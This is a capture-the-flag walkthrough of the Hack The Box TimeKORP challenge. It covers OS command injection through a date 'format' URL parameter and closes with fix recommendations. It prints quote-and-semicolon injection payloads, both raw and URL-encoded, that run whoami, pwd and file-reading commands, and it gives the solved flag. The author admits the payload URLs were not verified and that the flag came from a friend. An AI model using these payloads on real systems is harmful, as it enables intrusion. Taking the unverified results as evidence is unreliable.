

# Hack The Box: TimeKORP — Complete Walkthrough & Write-Up

## 1. Executive Summary and Scope

**Target Name:** TimeKORP  
**Assessment Date:** 13 November 2026  
**Platform:** Hack The Box (HTB)  
**Category:** Web  
**Vulnerability:** OS Command Injection  
**Difficulty:** Easy  

### Challenge Overview

TimeKORP is a web security challenge from Hack The Box's Cyber Apocalypse CTF 2024. The application presents a simple webpage that displays the current time and date.

The challenge demonstrates how unsafe handling of user input can allow an attacker to execute operating-system commands through a web application.

The main objective was to investigate how the time format was processed, identify the vulnerability, exploit it to execute commands, and retrieve the flag.

### Background and Storyline

TimeKORP belongs to Hack The Box's Cyber Apocalypse 2024 event, which uses a fictional dystopian setting.

In the event's storyline, a catastrophic event known as **The Great Division** reshapes society. The organization KORP rises to power, and different factions compete in an event known as **The Fray**.

The name TimeKORP combines the time-related functionality of the challenge with the fictional KORP organization. The challenge's simple time-display interface hides a security weakness that participants must discover.

## 2. Environment and Tools

### Target Information

- **Target URL:** `http://154.57.164.66:34589/`
- **Application:** TimeKORP web application
- **Operating System:** Linux (inferred from the exploitation technique)
- **Objective:** Retrieve the challenge flag.

### Tools Used

- Web browser — interacting with the application.
- Browser Developer Tools — inspecting the webpage and its source.
- Hack The Box challenge files — understanding the application structure.
- Browser address bar — testing URL parameters.

## 3. Reconnaissance

The first step was to access the target application through the browser.

**Target:**

`http://154.57.164.66:34589/`

### Initial Observations

The webpage displayed:

- A heading: **What's the time?**
- A digital clock showing the current time.
- A navigation option for displaying the date.

The page appeared simple, with no visible input field or form.

### Inspecting the Page Source

The page source revealed two important links:

```html
<a class="navbar-brand mb-0" href="?format=%H:%M:%S">
    🕒 What's the time?
</a>

<a class="nav-link" href="?format=%Y-%m-%d">
    📅 What's the date?
</a>
```

This revealed that the application uses a URL parameter named `format`.

The parameter determines how the time or date is displayed.

## 4. Enumeration

### Testing the Format Parameter

The next step was to investigate whether changing the `format` parameter affected the output.

**Original URL:**

```text
http://154.57.164.66:34589/?format=%H:%M:%S
```

**Test 1 — Display only the hour:**

```text
http://154.57.164.66:34589/?format=%H
```

The application displayed only the hour.

**Test 2 — Display the date:**

```text
http://154.57.164.66:34589/?format=%Y-%m-%d
```

The application displayed the date.

### Enumeration Findings

The tests established that:

1. The application accepts a user-controlled `format` parameter.
2. The parameter changes the output displayed by the application.
3. The application processes the supplied value rather than using only a fixed format.

This made the parameter an important area for further security investigation.

## 5. Vulnerability Assessment

### Identified Vulnerability: OS Command Injection

The challenge contains an OS command injection vulnerability.

Command injection occurs when an application passes user-controlled input into an operating-system command without safely validating or handling that input.

In this challenge, the time format is passed into a command that resembles:

```bash
date +'<user_input>'
```

The `date` command formats and displays the current date or time.

However, because the input is incorporated into a shell command, specially crafted input can break out of the intended command argument and introduce another command.

### Why This Is Vulnerable

The application does not safely separate the user's input from the operating-system command.

The shell interprets special characters such as:

- `'` — closes or opens a quoted string.
- `;` — separates commands.

If an attacker can manipulate these characters, they may execute additional operating-system commands.

## 6. Exploitation / Initial Access

### Step 1: Understanding the Injection

The vulnerable command can be represented as:

```bash
date +'<format>'
```

A crafted format value can close the existing quote, execute another command, and then reopen a quote so that the application's remaining command syntax stays valid.

### Step 2: Testing Command Execution

The following payload demonstrates the injection technique:

```text
%H'; echo 'proof
```

The resulting shell command becomes:

```bash
date +'%H'; echo 'proof'
```

The semicolon separates the original date command from the additional command.

### Step 3: Browser-Based Payload Testing

The following URLs show the corresponding URL-encoded payloads. They are reconstructed examples of the exploitation technique, not outputs independently verified during this assessment.

**Test command execution:**

```text
http://154.57.164.66:34589/?format=%H%27%3B%20echo%20%27proof
```

**Identify the running user:**

```text
http://154.57.164.66:34589/?format=%H%27%3B%20whoami%3B%20echo%20%27
```

**Identify the current directory:**

```text
http://154.57.164.66:34589/?format=%H%27%3B%20pwd%3B%20echo%20%27
```

### Step 4: Searching for the Flag

Once command execution is established, the next objective is to locate the flag.

A search command is:

```bash
find / -name 'flag*' 2>/dev/null
```

This searches the filesystem for files whose names begin with `flag`.

### Step 5: Reading the Flag

The published exploitation technique identifies `/flag` as the flag location.

The command to read it is:

```bash
cat /flag
```

The flag supplied by the friend who solved the challenge is recorded in the results section below.

## 7. Post-Exploitation

After obtaining command execution, the following activities help establish the extent of the vulnerability:

- Identify the operating-system user with `whoami`.
- Identify the current working directory with `pwd`.
- Search the filesystem for flag files.
- Read the flag file if accessible.

The vulnerability demonstrates that an attacker may execute operating-system commands with the privileges of the web application process.

The extent of access depends on the permissions assigned to that process.

## 8. Results and Evidence

### Key Findings

| Area | Result |
|---|---|
| Web application | TimeKORP |
| User-controlled parameter | `format` |
| Vulnerability | OS Command Injection |
| Injection characters | Single quote and semicolon |
| Command execution | Demonstrated by the published exploitation technique |
| Flag location | `/flag` |
| Challenge result | Flag obtained from the supplied solution |

### Retrieved Flag

```text
HTB{t1m3_f0r_th3_ult1m4t3_pwn4g3_9eab05b6c96349629dc804f0b412254d}
```

**Note:** This is the flag supplied by the friend who solved the challenge. It is recorded as the result for this write-up.

## 9. Findings and Recommendations

### Security Findings

**Finding 1: OS Command Injection**

The application incorporates user-controlled input into a shell command. This allows specially crafted input to alter the command being executed.

**Risk:** An attacker may execute arbitrary commands with the privileges of the web application process.

### Recommendations

1. **Avoid shell execution:** Use programming-language date and time functions instead of constructing shell commands.
2. **Validate user input:** Allow only supported date-format characters and reject unexpected input.
3. **Avoid direct input concatenation:** Never insert untrusted input directly into a shell command.
4. **Apply least privilege:** Run the web application with the minimum permissions required.
5. **Handle errors safely:** Avoid exposing internal command output or sensitive system information to users.
6. **Perform security testing:** Test all user-controlled parameters for injection vulnerabilities.

## 10. Conclusion

The TimeKORP challenge demonstrated how a seemingly harmless time-format parameter can introduce a serious security vulnerability.

The investigation began with basic webpage reconnaissance and source-code inspection. The `format` parameter was identified as the input controlling the displayed time and date.

Further analysis revealed that the application used this input in an operating-system command. Unsafe handling of the input made command injection possible.

The challenge illustrates an important web security lesson: **user input must never be trusted when it is used to construct operating-system commands.**

Understanding how input flows from a webpage into backend processing is essential when identifying and exploiting web vulnerabilities.

### References

- [Hack The Box — Cyber Apocalypse 2024 Event Recap](https://www.hackthebox.com/blog/cyber-apocalypse-2024-event-recap)
- [Hack The Box — Cyber Apocalypse 2024 Challenges Repository](https://github.com/hackthebox/cyber-apocalypse-2024)
- [TimeKORP — 7Rocky Walkthrough](https://7rocky.github.io/en/ctf/htb-challenges/web/timekorp/)
